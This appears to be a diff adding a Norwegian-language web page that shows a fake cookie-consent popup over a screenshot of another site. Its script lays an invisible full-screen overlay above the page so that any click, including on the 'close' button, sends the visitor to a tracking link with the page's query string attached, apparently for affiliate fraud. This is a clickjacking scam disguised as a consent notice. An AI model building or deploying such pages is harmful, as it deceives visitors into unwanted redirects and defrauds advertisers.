@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zenthia</title>
+
+<style>
+body {
+  margin: 0;
+  min-height: 100vh;
+  background-image: url("https://s3.eu-central-2.wasabisys.com/w.storage.screenshotapi.net/www_earthwolftrack_com_2s7bzzjr_22n1xnw9__3b5eb1bf822e.png");
+  background-size: cover;
+  background-position: center;
+  font-family: Arial, sans-serif;
+}
+
+/* overlay */
+#overlay {
+  position: fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background: rgba(0,0,0,0.6);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:9999;
+}
+
+/* popup */
+.popup {
+  background: #f9fafb;
+  padding: 30px 25px;
+  max-width: 360px;
+  width: 90%;
+  border-radius: 20px;
+  text-align: center;
+  box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+  border: 6px solid #eef5f8;
+}
+
+.popup h2 {
+  color: #2e7a63;
+  font-weight: 500;
+  margin-bottom: 15px;
+}
+
+.popup p {
+  color: #2e7a63;
+  font-size: 14px;
+  line-height: 1.5;
+}
+
+.buttons {
+  margin-top: 20px;
+  display:flex;
+  gap:10px;
+  justify-content:center;
+}
+
+button {
+  padding: 12px 20px;
+  border-radius: 12px;
+  cursor: pointer;
+  border: none;
+  font-size: 14px;
+}
+
+.accept {
+  background: #5bbfa1;
+  color: white;
+}
+
+.close {
+  background: transparent;
+  border: 2px solid #eef5f8;
+  color: #2e7a63;
+}
+
+.footer {
+  margin-top: 15px;
+  font-size: 12px;
+  color: #2e7a63;
+}
+</style>
+</head>
+
+<body>
+
+<div id="overlay">
+  <div class="popup">
+    <h2>Informasjonskapsler</h2>
+    <p>
+      Dette nettstedet bruker informasjonskapsler for å tilpasse innhold og annonser,
+      tilby funksjoner for sosiale medier og analysere trafikken vår. Ved å klikke på
+      «Tillat», samtykker du til bruk av informasjonskapsler. For mer informasjon,
+      se våre retningslinjer for informasjonskapsler.
+    </p>
+
+    <div class="buttons">
+      <button class="accept">Tillat</button>
+      <button class="close">Lukk</button>
+    </div>
+
+    <div class="footer">
+      Ditt personvern er viktig for oss
+    </div>
+  </div>
+</div>
+
+<script>
+function getAffiliateUrl(baseUrl) {
+  return baseUrl + window.location.search;
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  const baseUrl = "https://www.firewolftrack.com/2ZWCMC65/22N1XNW9/";
+  let clicked = false;
+
+  function redirect() {
+    if (clicked) return;
+    clicked = true;
+
+    const url = getAffiliateUrl(baseUrl);
+
+    const a = document.createElement("a");
+    a.href = url;
+    document.body.appendChild(a);
+    a.click();
+  }
+
+  // qualquer clique
+  document.body.addEventListener("click", redirect);
+
+  // overlay invisível (garantia total)
+  const overlay = document.createElement("div");
+  overlay.style.cssText = `
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    z-index:999999;
+    background:transparent;
+  `;
+  overlay.addEventListener("click", redirect);
+  document.body.appendChild(overlay);
+});
+</script>
+
+</body>
+</html>
